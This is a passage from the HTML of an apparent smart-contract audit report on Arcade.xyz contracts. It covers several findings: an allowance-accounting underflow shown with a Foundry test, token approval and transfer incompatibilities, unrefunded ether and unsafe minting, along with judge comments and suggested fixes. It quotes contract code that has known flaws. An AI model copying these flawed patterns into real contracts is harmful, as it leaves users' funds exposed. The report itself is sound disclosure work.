href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/171\">auditsea</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/161\">circlelooper</a>, and <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/2\">lanrebayode77</a></em></p>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>GSC_CORE_VOTING_ROLE</code> calls the <code>gscApprove(...)</code> function to approve tokens to be pulled from the treasury:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function gscApprove(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address token,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address spender,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amount</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external onlyRole(GSC_CORE_VOTING_ROLE) nonReentrant {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (spender == address(0)) revert T_ZeroAddress(&quot;spender&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (amount == 0) revert T_ZeroAmount();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Will underflow if amount is greater than remaining allowance</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        gscAllowance[token] -= amount;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _approve(token, spender, amount, spendThresholds[token].small);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>Each approval will decrease the <code>gscAllowance[token]</code> by the approved allowance amount, this is problematic as <code>GSC_CORE_VOTING_ROLE</code> may not able to decrease the approved allowance.</p>\n<p>Consider the following scenario:</p>\n<ol>\n<li><code>gscAllowance[token]</code> is 100.</li>\n<li><code>GSC_CORE_VOTING_ROLE</code> calls <code>gscApprove(...)</code> to give 60 allowance to a third party.</li>\n<li><code>gscAllowance[token]</code> is 40 now;</li>\n<li>Later, <code>GSC_CORE_VOTING_ROLE</code> finds the approved allowance is a bit too high and wants to decrease the allowance to 50.</li>\n<li><code>gscApprove(...)</code> is called again, but the transaction reverts due to an underflow error (<code>gscAllowance[token]</code> is less than 50).</li>\n</ol>\n<p>Please see the tests:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">contract ArcadeTreasuryTest is Test {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address timelock = address(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address coreVoting = address(2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address gscCoreVoting = address(3);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address other = address(4);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ArcadeTreasury treasury;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    MockToken mockToken;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function setUp() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        treasury = new ArcadeTreasury(timelock);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(timelock);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        treasury.grantRole(treasury.CORE_VOTING_ROLE(), coreVoting);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        treasury.grantRole(treasury.GSC_CORE_VOTING_ROLE(), gscCoreVoting);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        mockToken = new MockToken(&quot;Mock Token&quot;, &quot;MT&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        IArcadeTreasury.SpendThreshold memory threshold = IArcadeTreasury.SpendThreshold(100 ether, 200 ether, 300 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        treasury.setThreshold(address(mockToken), threshold);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function testGscApprove() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.warp(7 days);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.prank(timelock);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        treasury.setGSCAllowance(address(mockToken), 100 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(gscCoreVoting);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        treasury.gscApprove(address(mockToken), address(4), 60 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.expectRevert(stdError.arithmeticError);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        treasury.gscApprove(address(mockToken), address(4), 50 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract MockToken is ERC20 {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function mint(address account, uint256 amount) public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _mint(account, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>When approving a particular address, compare the new allowance with the current allowance (<a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/7222a31d548695998a475c9661fa159ef45a0e88/contracts/token/ERC20/IERC20.sol#L50\">IERC20.allowance(…)</a>):</p>\n<ol>\n<li>If the current allowance is equal to the new allowance, do nothing.</li>\n<li>If the current allowance is less than the new allowance, <code>gscAllowance[token] -= (new allowance - current allowance)</code>.</li>\n<li>If the current allowance is larger than the new allowance, <code>gscAllowance[token] += (current allowance - new allowance)</code>.</li>\n</ol>\n<h3 id=\"assessed-type-5\" style=\"position:relative;\"><a href=\"#assessed-type-5\" aria-label=\"assessed type 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assessed type</h3>\n<p>Access Control</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/58#issuecomment-1656737879\">__141345__ (lookout) commented</a>:</strong></p>\n<blockquote>\n<p>An already approved allowance can not be decreased. Might be an expected behavior. </p>\n<p>Because in this report, the focus is inner accounting <code>gscAllowance</code>, not the external ERC20 allowance <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/85\">Issue #85</a>. Here, the approved allowance seems different from the “ERC20 approved allowance”. Here, it can be seen as an account payable, the amount is spent, but the spender has not taken it yet. </p>\n<p>Or, if the designed behavior is to also provide a way to revoke the allowance, this inner accounting needs some improvement.</p>\n<p>To my understanding, the issue is rooted in the un-sync of internal and external allowance accounting.</p>\n<p><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/85\">Issue #85</a> also talks about the allowance issue. It also focuses more on ERC20 approved allowance override, which seems better pointing out the potential impact of with this mechanism. Some way to revoke the allowance, if the allowance is overwritten.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/58#issuecomment-1662883633\">PowVT (Arcade.xyz) disagreed with severity and confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/58#issuecomment-1673357684\">0xean (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Based on my current understanding, I think Medium is the correct severity here. </p>\n</blockquote>\n<h2 id=\"m-09-approve-zero-first\" style=\"position:relative;\"><a href=\"#m-09-approve-zero-first\" aria-label=\"m 09 approve zero first permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://gist.github.com/itsmetechjay/e494eb18a34459c4d7841fc6fdc700e1#m-1-approve-zero-first\">M-09 Approve zero first</a></h2>\n<p><em>Submitted by <a href=\"https://gist.github.com/itsmetechjay/e494eb18a34459c4d7841fc6fdc700e1#m-1-approve-zero-first\">c4lanky</a></em></p>\n<p><em>Note: this finding was reported via the winning <a href=\"https://gist.github.com/itsmetechjay/e494eb18a34459c4d7841fc6fdc700e1\">Automated Findings report</a>. It was declared out of scope for the audit, but is being included here for completeness.</em></p>\n<p>Some ERC20 tokens (like USDT) do not work when changing the allowance from an existing non-zero allowance value. For example, Tether (USDT)‘s <code>approve()</code> function will revert if the current approval is not zero, to protect against front-running changes of approvals.</p>\n<p>There are 1 instances of this issue:\nFile: contracts/ArcadeTreasury.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">384:     function _approve(address token, address spender, uint256 amount, uint256 limit) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">385:         // check that after processing this we will not have spent more than the block limit</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">386:         uint256 spentThisBlock = blockExpenditure[block.number];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">387:         if (amount + spentThisBlock &gt; limit) revert T_BlockSpendLimit();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">388:         blockExpenditure[block.number] = amount + spentThisBlock;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">389:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">390:         // approve tokens</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">391:         IERC20(token).approve(spender, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">392:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">393:         emit TreasuryApproval(token, spender, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">394:     }</span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/ArcadeTreasury.sol#L384-L394\">https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/ArcadeTreasury.sol#L384-L394</a></p>\n<p><strong><a href=\"https://gist.github.com/itsmetechjay/e494eb18a34459c4d7841fc6fdc700e1?permalink_comment_id=4716379#gistcomment-4716379\">PowVT (Arcade) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-10-the-surplus-ether-is-not-returned\" style=\"position:relative;\"><a href=\"#m-10-the-surplus-ether-is-not-returned\" aria-label=\"m 10 the surplus ether is not returned permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://gist.github.com/itsmetechjay/e494eb18a34459c4d7841fc6fdc700e1#m-2-the-surplus-ether-is-not-returned\">M-10 The surplus ether is not returned</a></h2>\n<p><em>Submitted by <a href=\"https://gist.github.com/itsmetechjay/e494eb18a34459c4d7841fc6fdc700e1#m-2-the-surplus-ether-is-not-returned\">c4lanky</a></em></p>\n<p><em>Note: this finding was reported via the winning <a href=\"https://gist.github.com/itsmetechjay/e494eb18a34459c4d7841fc6fdc700e1\">Automated Findings report</a>. It was declared out of scope for the audit, but is being included here for completeness.</em></p>\n<p>The function is marked as payable, but the surplus ether is not returned. This may lead to the loss of ether.</p>\n<p>The condition should be changed to check for equality, or the code should refund the excess.</p>\n<p>There are 1 instances of this issue:\nFile: contracts/nft/ReputationBadge.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">98:     function mint(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">99:         address recipient,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">100:         uint256 tokenId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">101:         uint256 amount,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">102:         uint256 totalClaimable,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">103:         bytes32[] calldata merkleProof</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">104:     ) external payable {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">105:         uint256 mintPrice = mintPrices[tokenId] * amount;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">106:         uint48 claimExpiration = claimExpirations[tokenId];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">107:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">108:         if (block.timestamp &gt; claimExpiration) revert RB_ClaimingExpired(claimExpiration, uint48(block.timestamp));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">109:         if (msg.value &lt; mintPrice) revert RB_InvalidMintFee(mintPrice, msg.value);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">110:         if (!_verifyClaim(recipient, tokenId, totalClaimable, merkleProof)) revert RB_InvalidMerkleProof();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">111:         if (amountClaimed[recipient][tokenId] + amount &gt; totalClaimable) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">112:             revert RB_InvalidClaimAmount(amount, totalClaimable);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">113:         }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">114:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">115:         // increment amount claimed</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">116:         amountClaimed[recipient][tokenId] += amount;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">117:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">118:         // mint to recipient</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">119:         _mint(recipient, tokenId, amount, &quot;&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">120:     }</span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol#L98-L120\">https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol#L98-L120</a></p>\n<p><strong><a href=\"https://gist.github.com/itsmetechjay/e494eb18a34459c4d7841fc6fdc700e1?permalink_comment_id=4716379#gistcomment-4716379\">PowVT (Arcade) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-11-use-_safemint-instead-of-_mint-for-erc721\" style=\"position:relative;\"><a href=\"#m-11-use-_safemint-instead-of-_mint-for-erc721\" aria-label=\"m 11 use _safemint instead of _mint for erc721 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://gist.github.com/itsmetechjay/e494eb18a34459c4d7841fc6fdc700e1#m-3-use-_safemint-instead-of-_mint-for-erc721\">M-11 Use <code>_safeMint</code> instead of <code>_mint</code> for ERC721</a></h2>\n<p><em>Submitted by <a href=\"https://gist.github.com/itsmetechjay/e494eb18a34459c4d7841fc6fdc700e1#m-3-use-_safemint-instead-of-_mint-for-erc721\">c4lanky</a></em></p>\n<p><em>Note: this finding was reported via the winning <a href=\"https://gist.github.com/itsmetechjay/e494eb18a34459c4d7841fc6fdc700e1\">Automated Findings report</a>. It was declared out of scope for the audit, but is being included here for completeness.</em></p>\n<p><code>_mint()</code> is discouraged in favor of <code>_safeMint()</code>, which ensures that the recipient is either an EOA or implements IERC721Receiver. Both OpenZeppelin and solmate have versions of this function.</p>\n<p>There are 1 instances of this issue:\nFile: contracts/nft/ReputationBadge.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">119:         _mint(recipient, tokenId, amount, &quot;&quot;);</span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol#L119\">https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol#L119</a></p>\n<p><strong><a href=\"https://gist.github.com/itsmetechjay/e494eb18a34459c4d7841fc6fdc700e1?permalink_comment_id=4716379#gistcomment-4716379\">PowVT (Arcade) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-12-unsafe-erc20-operations\" style=\"position:relative;\"><a href=\"#m-12-unsafe-erc20-operations\" aria-label=\"m 12 unsafe erc20 operations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://gist.github.com/itsmetechjay/e494eb18a34459c4d7841fc6fdc700e1#m-7-unsafe-erc20-operations\">M-12 Unsafe ERC20 operations</a></h2>\n<p><em>Submitted by <a href=\"https://gist.github.com/itsmetechjay/e494eb18a34459c4d7841fc6fdc700e1#m-7-unsafe-erc20-operations\">c4lanky</a></em></p>\n<p><em>Note: this finding was reported via the winning <a href=\"https://gist.github.com/itsmetechjay/e494eb18a34459c4d7841fc6fdc700e1\">Automated Findings report</a>. It was declared out of scope for the audit, but is being included here for completeness.</em></p>\n<p>Certain tokens may not adhere to the ERC20 standard completely, yet they are generally accepted by most code designed for ERC20 tokens. An instance of this is Tether (USDT), where the <code>transfer()</code> and <code>transferFrom()</code> functions on L1 do not conform to the specification’s requirement of returning booleans; instead, they have no return value.</p>\n<p>Consequently, when such tokens are cast to IERC20, their function signatures do not align, leading to reverted calls (refer to this link for a test case). To mitigate this issue, it is recommended to utilize OpenZeppelin’s SafeERC20’s <code>safeTransfer()</code> and <code>safeTransferFrom()</code> functions instead.</p>\n<p>There are 2 instances of this issue:\nFile: contracts/ARCDVestingVault.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">201:         token.transferFrom(msg.sender, address(this), amount);</span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/ARCDVestingVault.sol#L201\">https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/ARCDVestingVault.sol#L201</a></p>\n<p>File: contracts/NFTBoostVault.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">657:         token.transferFrom(from, address(this), amount);</span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/NFTBoostVault.sol#L657\">https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/NFTBoostVault.sol#L657</a></p>\n<p><strong><a href=\"https://gist.github.com/itsmetechjay/e494eb18a34459c4d7841fc6fdc700e1?permalink_comment_id=4716379#gistcomment-4716379\">PowVT (Arcade) confirmed</a></strong></p>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this audit, 20 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/274\">report highlighted below</a> by <strong>LaScaloneta</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/541\">QiuhaoLi</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/485\">BugBusters</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/422\">DadeKuma</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/389\">0xComfyCat</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/329\">Udsen</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/244\">bart1e</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/220\">zhaojie</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/551\">ak1</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/513\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/492\">0xDING99YA</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/467\">immeas</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/449\">oakcobalt</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/352\">squeaky_cactus</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/343\">matrix_0wl</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/328\">koxuan</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/152\">Sathish9098</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/126\">ABA</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/123\">0xnev</a>, and <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/96\">MohammedRizwan</a>.</em></p>\n<h2 id=\"l-01-the-merkle-root-wont-revert-if-is-set-to-0x00\" style=\"position:relative;\"><a href=\"#l-01-the-merkle-root-wont-revert-if-is-set-to-0x00\" aria-label=\"l 01 the merkle root wont revert if is set to 0x00 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-01] The merkle root won’t revert if is set to <code>0x00</code></h2>\n<p>If merkle root is set to <code>0x00</code> it could leave the system in an 